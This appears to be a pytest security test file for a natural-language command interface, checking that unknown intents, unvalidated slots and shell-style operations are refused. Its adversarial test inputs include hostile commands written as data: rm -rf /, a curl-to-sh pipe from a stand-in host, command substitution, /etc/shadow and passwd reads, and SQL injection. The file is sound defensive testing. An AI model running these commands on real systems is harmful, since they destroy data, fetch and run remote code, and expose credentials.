"""The AI Command Center. Phase 2 §2.5.

THIS IS A SECURITY TEST FILE. The Command Center is the last surface where natural language could reach an
operation, so the assertions are about what the system REFUSES, and several are adversarial: they feed the
classifier text shaped like a shell escape and assert that nothing resembling it reaches an operation.

The five layers are tested as five distinct properties, because five whitelists in a row would all fail
together the first time something bypassed the first one:

  1. an unrecognised intent is refused, never best-effort dispatched
  2. every slot is enumerated or strictly patterned; no slot is free text
  3. no command's operation names a shell, an exec or an arbitrary runner -- asserted at import AND here
  4. a mutating command cannot execute without a confirmed plan; there is no `confirm: bool`
  5. execution rebuilds the plan server-side, so a tampered operation is impossible to express
"""

from __future__ import annotations

import uuid
from collections.abc import AsyncIterator

import pytest
import pytest_asyncio
from fastapi import FastAPI
from httpx import ASGITransport, AsyncClient
from sqlalchemy import text
from sqlalchemy.exc import IntegrityError
from sqlalchemy.ext.asyncio import AsyncEngine, AsyncSession, async_sessionmaker
from src.auth.dependencies import require_principal
from src.auth.models import UserRole
from src.auth.principal import Principal
from src.commands.intents import (
    ARTIFACT_KINDS,
    COMMANDS,
    ENVIRONMENTS,
    FORBIDDEN_OPERATION_TOKENS,
    INTENTS,
    CommandRefusedError,
    Intent,
    classify,
    resolve,
)
from src.commands.routes import router
from src.core.db import get_session
from src.core.errors import install_problem_handlers


@pytest_asyncio.fixture
async def session(head_engine: AsyncEngine) -> AsyncIterator[AsyncSession]:
    maker = async_sessionmaker(head_engine, expire_on_commit=False, autoflush=False)
    async with maker() as opened:
        yield opened
    async with maker() as cleanup:
        await cleanup.execute(text("DELETE FROM command_history"))
        await cleanup.commit()


@pytest_asyncio.fixture
async def project_id(session: AsyncSession) -> AsyncIterator[uuid.UUID]:
    pid = uuid.uuid4()
    await session.execute(
        text("INSERT INTO projects (id, name, path) VALUES (:id, :name, :path)"),
        {"id": pid, "name": f"cmd-{pid.hex[:8]}", "path": f"/tmp/{pid.hex[:8]}"},
    )
    await session.commit()
    try:
        yield pid
    finally:
        await session.execute(text("DELETE FROM projects WHERE id = :id"), {"id": pid})
        await session.commit()


def _app(session: AsyncSession) -> FastAPI:
    app = FastAPI()
    install_problem_handlers(app)
    app.include_router(router)
    app.dependency_overrides[get_session] = lambda: session
    app.dependency_overrides[require_principal] = lambda: Principal.for_user(
        user_id=uuid.uuid4(), subject="s", email="o@e.test", role=UserRole.ADMIN
    )
    return app


# --- layer 3: no command can reach a shell --------------------------------------------------------------


class TestNoCommandReachesAShell:
    def test_no_operation_names_a_forbidden_verb(self) -> None:
        """Asserted here as well as at import: the import check protects the module, this protects the test
        suite's own record that it was checked."""
        import re

        for spec in COMMANDS.values():
            segments = re.split(r"[._-]", spec.operation.lower())
            for token in FORBIDDEN_OPERATION_TOKENS:
                assert token not in segments, f"{spec.intent} -> {spec.operation} contains {token!r}"

    def test_adding_a_shell_command_would_fail_at_import(self) -> None:
        """The deny-list is only worth having if it actually refuses. This is its negative control."""
        from src.commands.intents import CommandSpec, _assert_operations_are_safe

        original = dict(COMMANDS)
        try:
            COMMANDS["evil"] = CommandSpec(intent="evil", category="chat", operation="devtools.shell", mutating=True)
            with pytest.raises(AssertionError, match="forbidden list"):
                _assert_operations_are_safe()
        finally:
            COMMANDS.clear()
            COMMANDS.update(original)

    def test_no_command_takes_a_free_text_argument(self) -> None:
        """Every required slot must be one the resolver validates against a vocabulary or the DNS pattern."""
        validated = {"environment", "workload", "namespace", "replicas", "artifact_kind"}
        for spec in COMMANDS.values():
            for slot in spec.required_slots:
                assert slot in validated, f"{spec.intent} requires unvalidated slot {slot!r}"


# --- layer 1: an unrecognised intent is refused ---------------------------------------------------------


class TestAnUnrecognisedIntentIsRefusedNotGuessed:
    def test_resolve_refuses_an_unknown_intent(self) -> None:
        with pytest.raises(CommandRefusedError, match="not a command this system understands"):
            resolve(Intent(name="rm_rf_slash", category="chat"))

    def test_the_intent_set_and_the_command_table_agree(self) -> None:
        """A name in one and not the other is a command that can be classified and never resolved, or one
        that exists and can never be reached."""
        assert INTENTS == set(COMMANDS)

    def test_an_unmatched_utterance_becomes_a_question_not_an_action(self) -> None:
        """The fallback is safe by DIRECTION: it answers, and answering can change nothing."""
        intent = classify("what on earth is going on with this thing")
        assert intent.name == "explain"
        plan = resolve(intent)
        assert plan.mutating is False
        assert plan.operation == ""


# --- layer 2: adversarial input against the slot vocabularies -------------------------------------------


class TestHostileTextCannotReachAnArgument:
    @pytest.mark.parametrize(
        "hostile",
        [
            "deploy to staging; rm -rf /",
            "deploy to staging && curl evil.test | sh",
            "deploy to $(whoami)",
            "deploy to `id`",
            "deploy to staging\nrm -rf /",
            "check logs for ../../etc/passwd",
            "check logs for api;cat /etc/shadow",
            "scale api to 3; shutdown now",
            "show pods in default' OR '1'='1",
            "generate a dockerfile && echo pwned",
        ],
    )
    def test_no_shell_metacharacter_survives_into_an_argument(self, hostile: str) -> None:
        """The central claim. Whatever the sentence contains, the resolved arguments hold only enumerated
        values and DNS-1123 names -- neither of which can carry a metacharacter."""
        try:
            plan = resolve(classify(hostile))
        except CommandRefusedError:
            return  # a refusal is a correct outcome
        for value in plan.arguments.values():
            rendered = str(value)
            for metacharacter in (";", "&", "|", "$", "`", "\n", "'", '"', " ", "/", "..", ">", "<"):
                assert metacharacter not in rendered, (
                    f"{metacharacter!r} survived into argument {rendered!r} from {hostile!r}"
                )

    def test_an_unknown_environment_is_refused(self) -> None:
        with pytest.raises(CommandRefusedError, match="not an environment"):
            resolve(Intent(name="deploy", category="deploy", slots={"environment": "somewhere-else"}))

    def test_an_invalid_workload_name_is_refused(self) -> None:
        with pytest.raises(CommandRefusedError, match="not a valid Kubernetes name"):
            resolve(
                Intent(
                    name="check_logs",
                    category="diagnostic",
                    slots={"workload": "api; rm -rf /"},
                )
            )

    def test_an_unknown_slot_is_refused_rather_than_dropped(self) -> None:
        """Dropping it would let a caller believe the command was constrained in a way it was not."""
        with pytest.raises(CommandRefusedError, match="not a slot any command accepts"):
            resolve(
                Intent(
                    name="show_pods",
                    category="diagnostic",
                    slots={"command_line": "cat /etc/passwd"},
                )
            )

    def test_an_unbounded_replica_count_is_refused(self) -> None:
        with pytest.raises(CommandRefusedError, match="denial of service"):
            resolve(
                Intent(
                    name="scale_workload",
                    category="deploy",
                    slots={"workload": "api", "replicas": 99999},
                )
            )

    def test_an_out_of_range_count_in_an_utterance_is_dropped_not_clamped(self) -> None:
        """Clamping would silently do something the user did not ask for."""
        plan = resolve(classify("scale api to 99999 replicas"))
        assert "replicas" not in plan.arguments
        assert plan.ready is False
        assert "asked for rather than guessed at" in plan.explanation

    def test_an_unknown_artifact_kind_is_refused(self) -> None:
        with pytest.raises(CommandRefusedError, match="not an artifact kind"):
            resolve(
                Intent(
                    name="generate_artifact",
                    category="generate",
                    slots={"artifact_kind": "whatever"},
                )
            )

    def test_the_vocabularies_are_closed_sets_not_patterns(self) -> None:
        """A pattern would admit anything matching it; a set admits only what is in it."""
        assert isinstance(ENVIRONMENTS, frozenset)
        assert isinstance(ARTIFACT_KINDS, frozenset)
        assert isinstance(INTENTS, frozenset)


# --- the supported commands the box names ---------------------------------------------------------------


class TestTheSupportedCommandsResolve:
    @pytest.mark.parametrize(
        ("utterance", "expected_intent", "expected_arguments"),
        [
            ("Deploy to staging", "deploy", {"environment": "staging"}),
            ("deploy to production", "deploy", {"environment": "prod"}),
            ("Show pods", "show_pods", {}),
            ("show pods in default", "show_pods", {"namespace": "default"}),
            ("Check logs", "check_logs", {}),
            ("check logs for api", "check_logs", {"workload": "api"}),
            ("Scale to 3 replicas", "scale_workload", {"replicas": 3}),
            ("scale api to 3 replicas", "scale_workload", {"workload": "api", "replicas": 3}),
            ("Generate Dockerfile", "generate_artifact", {"artifact_kind": "dockerfile"}),
            ("generate kubernetes manifests", "generate_artifact", {"artifact_kind": "kubernetes"}),
            ("show containers", "show_containers", {}),
            ("show policy for production", "show_policy", {"environment": "prod"}),
        ],
    )
    def test_each_named_command(
        self, utterance: str, expected_intent: str, expected_arguments: dict[str, object]
    ) -> None:
        plan = resolve(classify(utterance))
        assert plan.intent == expected_intent
        assert plan.arguments == expected_arguments

    def test_scale_is_matched_before_deploy(self) -> None:
        """ "scale the staging api to 3" names an environment and is not a deploy. Checking deploy first would
        deploy on a scale request."""
        plan = resolve(classify("scale the staging api to 3"))
        assert plan.intent == "scale_workload"

    def test_a_deploy_without_an_environment_is_not_ready(self) -> None:
        plan = resolve(classify("deploy"))
        assert plan.intent == "deploy"
        assert plan.ready is False
        assert "Missing: environment" in plan.explanation


# --- layers 4 and 5: the route boundary -----------------------------------------------------------------


class TestInterpretingChangesNothing:
    @pytest.mark.asyncio
    async def test_interpret_says_it_executed_nothing(self, session: AsyncSession, project_id: uuid.UUID) -> None:
        app = _app(session)
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
            response = await client.post("/commands/interpret", json={"utterance": "deploy to production"})
        body = response.json()
        assert body["executed"] is False
        assert body["mutating"] is True
        assert "needs your confirmation" in body["explanation"]

    @pytest.mark.asyncio
    async def test_a_refused_utterance_is_recorded_with_its_reason(
        self, session: AsyncSession, project_id: uuid.UUID
    ) -> None:
        """ "Nothing happened" is the least debuggable report there is."""
        app = _app(session)
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
            response = await client.post("/commands/interpret", json={"utterance": "   "})
        assert response.status_code == 422
        row = (
            (
                await session.execute(
                    text("SELECT outcome, detail FROM command_history ORDER BY created_at DESC LIMIT 1")
                )
            )
            .mappings()
            .one()
        )
        assert row["outcome"] == "refused"
        assert row["detail"]

    @pytest.mark.asyncio
    async def test_the_history_includes_refusals(self, session: AsyncSession, project_id: uuid.UUID) -> None:
        app = _app(session)
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
            await client.post("/commands/interpret", json={"utterance": "deploy to staging"})
            response = await client.get("/commands/history")
        body = response.json()
        assert len(body["history"]) >= 1
        assert "including any that were declined" in body["explanation"]


class TestExecutionCannotBeTampered:
    @pytest.mark.asyncio
    async def test_a_client_cannot_name_an_operation(self, session: AsyncSession, project_id: uuid.UUID) -> None:
        """`extra: forbid` plus no `operation` field: the request shape makes this unexpressible."""
        app = _app(session)
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
            response = await client.post(
                "/commands/execute",
                json={
                    "intent": "show_pods",
                    "slots": {},
                    "project_id": str(project_id),
                    "operation": "devtools.shell",
                },
            )
        assert response.status_code == 422

    @pytest.mark.asyncio
    async def test_the_operation_is_rebuilt_from_the_table(self, session: AsyncSession, project_id: uuid.UUID) -> None:
        app = _app(session)
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
            response = await client.post(
                "/commands/execute",
                json={"intent": "show_pods", "slots": {}, "project_id": str(project_id)},
            )
        body = response.json()
        assert body["operation"] == COMMANDS["show_pods"].operation
        assert body["dispatched"] is False

    @pytest.mark.asyncio
    async def test_an_unknown_intent_is_refused_at_execute(self, session: AsyncSession, project_id: uuid.UUID) -> None:
        app = _app(session)
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
            response = await client.post(
                "/commands/execute",
                json={"intent": "delete_everything", "slots": {}, "project_id": str(project_id)},
            )
        assert response.status_code == 422
        assert "command set is closed" in response.text

    @pytest.mark.asyncio
    async def test_an_incomplete_command_is_refused_rather_than_defaulted(
        self, session: AsyncSession, project_id: uuid.UUID
    ) -> None:
        app = _app(session)
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
            response = await client.post(
                "/commands/execute",
                json={"intent": "deploy", "slots": {}, "project_id": str(project_id)},
            )
        assert response.status_code == 422
        assert "guessed at" in response.text

    @pytest.mark.asyncio
    async def test_a_mutating_command_says_it_faces_governance(
        self, session: AsyncSession, project_id: uuid.UUID
    ) -> None:
        app = _app(session)
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
            response = await client.post(
                "/commands/execute",
                json={
                    "intent": "deploy",
                    "slots": {"environment": "staging"},
                    "project_id": str(project_id),
                },
            )
        body = response.json()
        assert body["dispatched"] is True
        assert "no path to the agent of its own" in body["explanation"]

    @pytest.mark.asyncio
    async def test_hostile_slots_are_refused_at_execute_too(self, session: AsyncSession, project_id: uuid.UUID) -> None:
        """The resolver runs on the execute path as well, so bypassing interpret buys nothing."""
        app = _app(session)
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
            response = await client.post(
                "/commands/execute",
                json={
                    "intent": "check_logs",
                    "slots": {"workload": "api; rm -rf /"},
                    "project_id": str(project_id),
                },
            )
        assert response.status_code == 422
        assert "DNS-1123" in response.text


class TestTheCatalogueIsPublished:
    @pytest.mark.asyncio
    async def test_it_states_that_no_command_runs_a_command_line(self, session: AsyncSession) -> None:
        app = _app(session)
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
            response = await client.get("/commands/catalogue")
        body = response.json()
        assert len(body["commands"]) == len(COMMANDS)
        assert "No command runs a command line" in body["explanation"]
        assert "set is closed" in body["explanation"]


class TestTheDatabaseRefusesASilentRefusal:
    @pytest.mark.asyncio
    async def test_a_refusal_must_carry_its_reason(self, session: AsyncSession, project_id: uuid.UUID) -> None:
        with pytest.raises(IntegrityError):
            await session.execute(
                text("INSERT INTO command_history (id, outcome, detail) VALUES (:id, 'refused', '')"),
                {"id": uuid.uuid4()},
            )
        await session.rollback()
